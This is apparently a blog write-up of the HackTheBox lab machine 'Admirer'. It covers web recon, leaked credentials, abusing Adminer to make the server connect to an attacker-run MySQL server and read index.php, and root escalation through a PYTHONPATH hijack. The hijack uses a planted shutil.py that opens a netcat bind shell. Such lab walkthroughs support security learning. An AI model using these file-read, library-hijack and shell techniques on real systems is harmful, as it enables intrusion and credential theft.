---
title: HTB-Admirer
date: "2020-09-01"
description: Linux box with misconfigured SQL-admin and python path injection.
tldr: Admirer, python
tags: [linux,admirer,htb,hackthebox]

---

## Information Gathering
When surfing to the IP address, there's a webpage with pictures being presented. 

![htb-admirer-1](/img/htb-admirer-1.png)

the `robots.txt` file revealed an interesting folder as well: 

```
robots.txt  
User-agent: *  
  
# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo  
Disallow: /admin-dir
```

## Scan 
To find some type of opening, a couple of other tools were used. 

### gobuster
```shell
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 40 -s 301,302,200,401,403 -u [http://10.10.10.187/admin-dir/](http://10.10.10.187/admin-dir/)  
===============================================================  
Gobuster v3.0.1  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)  
===============================================================  
[+] Url: [http://10.10.10.187/admin-dir/](http://10.10.10.187/admin-dir/)  
[+] Threads: 40  
[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/common.txt  
[+] Status codes: 200,301,302,401,403  
[+] User Agent: gobuster/3.0.1  
[+] Timeout: 10s  
===============================================================  
2020/09/01 19:59:33 Starting gobuster  
===============================================================  
/contacts.txt (Status: 200)  
/credentials.txt (Status: 200)  
/.htaccess (Status: 403)  
/.htpasswd (Status: 403)  
/.hta (Status: 403)  
===============================================================  
2020/09/01 19:59:39 Finished  
===============================================================
```


### nmap
scan for open ports 

```shell
# Nmap 7.80 scan initiated Tue Sep 1 18:54:41 2020 as: nmap -p21,22,80 -sC -sV -Pn -oA nmap/admirer --script vuln -vvv 10.10.10.187  
Pre-scan script results:  
| broadcast-avahi-dos:  
| Discovered hosts:  
| 224.0.0.251  
| After NULL UDP avahi packet DoS (CVE-2011-1002).  
|_ Hosts are all up (not vulnerable).  
Nmap scan report for 10.10.10.187  
Host is up, received user-set (0.030s latency).  
Scanned at 2020-09-01 18:55:18 CEST for 29s  
  
PORT STATE SERVICE REASON VERSION  
21/tcp open ftp syn-ack ttl 63 vsftpd 3.0.3  
|_clamav-exec: ERROR: Script execution failed (use -d to debug)  
|_sslv2-drown:  
22/tcp open ssh syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)  
|_clamav-exec: ERROR: Script execution failed (use -d to debug)  
80/tcp open http syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))  
|_clamav-exec: ERROR: Script execution failed (use -d to debug)  
| http-csrf:  
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.187  
| Found the following possible CSRF vulnerabilities:  
|  
| Path: http://10.10.10.187:80/
| Form id: name  
|_ Form action: #  
|_http-dombased-xss: Couldn't find any DOM based XSS.  
| http-enum:  
|_ /robots.txt: Robots file  
| http-fileupload-exploiter:  
|  
| Couldn't find a file-type field.  
|  
|_ Couldn't find a file-type field.
```


### wfuzz
To see whether there's more things/utilities we can access, wfuzz is used as well. 

```shell
$ wfuzz -w /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt --hc=403,404 http://10.10.10.187/utility-scripts/FUZZ
  
Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.  
  
********************************************************  
* Wfuzz 2.4.5 - The Web Fuzzer *  
********************************************************  
  
Target: http://10.10.10.187/utility-scripts/FUZZ
Total requests: 4288  
  
===================================================================  
ID Response Lines Word Chars Payload  
===================================================================  
  
000000997: 200 51 L 235 W 4157 Ch "adminer.php"  
000002335: 200 964 L 4976 W 84028 Ch "info.php"  
000003215: 200 0 L 8 W 32 Ch "phptest.php"  
  
Total time: 14.83322  
Processed Requests: 4288  
Filtered Requests: 4285  
Requests/sec.: 289.0808
```

just to see if wfuzz can find the same files as gobuster, lets try it out: 
```shell
$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc=403,404 http://10.10.10.187/admin-dir/FUZZ 
  
Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.  
  
********************************************************  
* Wfuzz 2.4.5 - The Web Fuzzer *  
********************************************************  
  
Target: [http://10.10.10.187/admin-dir/FUZZ](http://10.10.10.187/admin-dir/FUZZ)  
Total requests: 4658  
  
===================================================================  
ID Response Lines Word Chars Payload  
===================================================================  
  
000001205: 200 29 L 39 W 350 Ch "contacts.txt"  
000001273: 200 11 L 13 W 136 Ch "credentials.txt"  
  
Total time: 14.57641  
Processed Requests: 4658  
Filtered Requests: 4656  
Requests/sec.: 319.5573
```


## Enumeration
under the `/admin-dir` folder on the server, some files were accessible/readable. 

file: `contacts.txt`
contents: 
```shell
##########  
# admins #  
##########  
# Penny  
Email: p.wise@admirer.htb  
  
  
##############  
# developers #  
##############  
# Rajesh  
Email: r.nayyar@admirer.htb  
  
# Amy  
Email: a.bialik@admirer.htb  
  
# Leonard  
Email: l.galecki@admirer.htb  
  
  
#############  
# designers #  
#############  
# Howard  
Email: h.helberg@admirer.htb  
  
# Bernadette  
Email: b.rauch@admirer.htb
```

Some credentials were found in `credentials.txt`

```shell
[Internal mail account]  
w.cooper@admirer.htb  
fgJr6q#S\W:$P  
  
[FTP account]  
ftpuser  
%n?4Wz}R$tTF7  
  
[Wordpress account]  
admin  
w0rdpr3ss01!
```

where the FTP account works and we can download a SQL dump plus the packed version of the site.

some new folders were found, like  `w4ld0s_s3cr3t_d1r` and  `utility-scripts` where the folder `utility-scripts` contains some interesting stuff like: `info.php` and `admin_tasks.php` 

along with that, some database credentials were found: 
```php
db_admin.php  
<?php  
$servername = "localhost";  
$username = "waldo";  
$password = "Wh3r3_1s_w4ld0?";
```

## Attack 
The tool `adminer` has a vulnerability according to: [link](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool) , which can be used in this case to extract information and do further enumeration.

First, set up a local mysql server/service 

```shell 
# start the mysql server/service and login to the management console  
sudo systemctl start mysql  
sudo mysql  
  
# create DB  
CREATE DATABASE admirer;  
  
# create user  
INSERT INTO mysql.user (User,Host,authentication_string,ssl_cipher,x509_issuer,x509_subject) VALUES('user','%',PASSWORD('password1'),'','','');  
  
# tell mysql to re-read config, to activate the changes  
FLUSH PRIVILEGES;  
  
# change DB  
USE admirer;  
  
# fix permissions for the user  
GRANT ALL PRIVILEGES ON *.* TO 'user'@'%';  
  
#create test-table where all the data will land  
create table test(data VARCHAR(255));  
  
  
# enable remote access to the DB  
sudo vim /etc/mysql/mariadb.conf.d/50-server.cnf  
change bind-address from 127.0.0.1 to 0.0.0.0  
  
# restart mysql to activate the changes  
sudo systemctl restart mysql
```

After the local DB is up and running, we need to make the victim-server connect back to us.

![htb-admirer-2](/img/htb-admirer-2.png)

if the connction fails, run a curl command, and then visit the login-page again.

```shell
curl "http://10.10.10.187/utility-scripts/adminer.php?server=10.10.14.16&username=user&db=admirer"
```

![htb-admirer-3](/img/htb-admirer-3.png)

time to play around with the database and see what type of information that can be extracted.

```sql
load data local infile '../index.php'  
into table test  
fields terminated by "/n"
```

looking at the table, some of the values could be exported.

```shell
INSERT INTO `test` (`data`) VALUES  
(' $servername = \"localhost\";'),  
(' $username = \"waldo\";'),  
(' $password = \"&<h5b~yK3F#{PaPB&dA}{H>\";'),  
(' $dbname = \"admirerdb\";');
```

where waldo's SSH password might just be: `&<h5b~yK3F#{PaPB&dA}{H>`

## Privilege Escalation 

user access is gained with: 
```shell
ssh waldo@admirer.htb
password: &<h5b~yK3F#{PaPB&dA}{H>
```

![htb-admirer-5](/img/htb-admirer-5.png)

user flag: 
```shell
waldo@admirer:~$ cat user.txt  
70b98c6e7c3d753017c20f10184ce382
```

time to escalate privileges and see what waldo is permitted to do. 
```shell
waldo@admirer:~$ sudo -l  
[sudo] password for waldo:  
Matching Defaults entries for waldo on admirer:  
env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always  
  
User waldo may run the following commands on admirer:  
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```

where the `admin_tasks.sh` file looks kind of interesting and warrants further investigation.

a specific part of the bash-script runs a python script. 
```bash
backup_web()  
{  
    if [ "$EUID" -eq 0 ]  
    then  
        echo "Running backup script in the background, it might take a while..."  
        /opt/scripts/backup.py &  
    else  
        echo "Insufficient privileges to perform the selected operation."  
    fi  
}
```

and the python script looks like: 
```python
#!/usr/bin/python3  
  
from shutil import make_archive  
  
src = '/var/www/html/'  
  
# old ftp directory, not used anymore  
#dst = '/srv/ftp/html'  
  
dst = '/var/backups/html'  
  
make_archive(dst, 'gztar', src)
```

because `shutil` is imported, we'll use that for some hijacking.

create our own `shutil.py` with under `/tmp/temp`

```shell
mkdir -p /tmp/temp
```

enter the following into the `shutil.py`
```python
import os  
os.system("nc -lvp 9001 -e /bin/bash")
```

this will create a bind shell on the target/victim on port 9001 once the backup script is run.
Time to abuse the ENV permission with sudo. 
```shell
cd /tmp/temp  
sudo -E PYTHONPATH=$(pwd) /opt/scripts/admin_tasks.sh 6
```

and it will look something like this: 
```shell
waldo@admirer:/tmp/temp$ sudo -E PYTHONPATH=$(pwd) /opt/scripts/admin_tasks.sh 6  
Running backup script in the background, it might take a while...  
waldo@admirer:/tmp/temp$ listening on [any] 9001 ...
```

### root
connect to the bind-shell with netcat and enhance the shell.

```shell
$ nc -nv 10.10.10.187 9001  
Ncat: Version 7.80 ( [https://nmap.org/ncat](https://nmap.org/ncat) )  
Ncat: Connected to 10.10.10.187:9001.  
id  
uid=0(root) gid=0(root) groups=0(root)  
python -c 'import pty;pty.spawn("/bin/bash")'  
root@admirer:/tmp/temp# ls  
ls  
shutil.py  
root@admirer:/tmp/temp# cd /root  
cd /root  
root@admirer:/root# ls  
ls  
root.txt  
root@admirer:/root# cat root.txt  
cat root.txt  
42616c7ad960081e92e84a6714880ce1  
root@admirer:/root# ip addr  
ip addr  
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1  
link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00  
inet 127.0.0.1/8 scope host lo  
valid_lft forever preferred_lft forever  
inet6 ::1/128 scope host  
valid_lft forever preferred_lft forever  
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000  
link/ether 00:50:56:b9:43:24 brd ff:ff:ff:ff:ff:ff  
inet 10.10.10.187/24 brd 10.10.10.255 scope global eth0  
valid_lft forever preferred_lft forever  
inet6 dead:beef::250:56ff:feb9:4324/64 scope global mngtmpaddr dynamic  
valid_lft 85923sec preferred_lft 13923sec  
inet6 fe80::250:56ff:feb9:4324/64 scope link  
valid_lft forever preferred_lft forever
```

## EOF 